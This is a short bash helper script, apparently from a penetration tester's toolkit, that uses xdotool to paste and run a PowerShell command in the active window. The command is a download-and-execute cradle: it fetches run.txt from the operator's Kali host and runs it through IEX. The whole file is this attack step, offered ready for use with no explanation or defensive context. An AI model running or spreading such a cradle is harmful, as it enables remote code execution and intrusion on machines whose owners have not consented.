#!/bin/bash

: '
PowerShell: Download and execute script from run.txt.
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

paste_command "(new-object system.net.webclient).downloadstring('http://${KALI_IP}/b/run.txt') | IEX; "
xdotool key Return